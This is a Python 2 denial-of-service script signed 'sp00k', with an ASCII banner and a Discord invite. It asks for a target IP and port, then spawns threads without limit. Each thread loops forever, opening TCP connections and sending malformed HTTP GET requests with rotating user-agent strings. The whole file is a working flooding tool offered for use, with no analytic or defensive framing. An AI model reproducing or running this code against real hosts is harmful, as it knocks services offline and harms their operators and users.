import os
import sys
import socket
import random
import threading
from sys import platform

"""
Created By: sp00k
"""

if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "This Script Works Best on Kali linux"
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;31m [-]Unknown System Detected \033[1;m"

print "\033[1;31m"

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print """
                      .oooo.      .oooo.  oooo        
                     d8P'`Y8b   d8P'`Y8b  `888       
 .oooo.o oo.ooooo.  888    888 888    888  888  oooo  
d88(  "8  888' `88b 888    888 888    888  888 .8P'   
`"Y88b.   888   888 888    888 888    888  888888.    
o.  )88b  888   888 `88b  d88' `88b  d88'  888 `88b.  
8""888P'  888bod8P'  `Y8bd8P'   `Y8bd8P'  o888o o888o 
          888                                         
         o888o                                        
  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             Created By: sp00k
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    
        don't go crazy on the bytes 
 because you'll end up hitting yourself off 
             discord.gg/sGRCSyH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          python 2.7.16 works best
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            Your IP is VISIBLE. 
   If you're using a VPN/OVH. Ignore this.
"""


user_server = raw_input("\033[1;31m IP: \033[1;31m")
user_port = input("\033[1;31m PORT: \033[1;31m")
agent = []
count = 0


def user_agent():
    global agent
    agent.append("Mozilla/5.0 (Linux; Android 7.0; SM-G892A BuVersion/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36")
    agent.append("Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 ( like Gecko)")
    agent.append("Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) 4.0 Mobile Safari/533.1")
    agent.append("Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)")
    agent.append("Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0;")
    return agent


class Socks(threading.Thread):
    def run(self):
        global user_server, user_port, count
        while True:
            try:
                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                packet = "GET / HTTP/1.1\n Host: " + user_server + "\n\n User-Agent:" + random.choice(user_agent())
                soc.connect((user_server, int(user_port)))
                soc.sendto(packet, (user_server, int(user_port)))
                count += 1
                print ("\033[1;32m Tcp send \033[1;m {0}".format(count))
            except KeyboardInterrupt:
                exit("\033[1;32m [-]Canceled By User \033[1;m")
                break
            except socket.error:
                print ("\033[1;32m Connection Error Server Might be Down \033[1;32m")
                pass


while True:
    try:
        th1 = Socks()
        th1.start()
    except KeyboardInterrupt:
        exit("\033[1;32m [-]Canceled By User \033[1;m")
        break
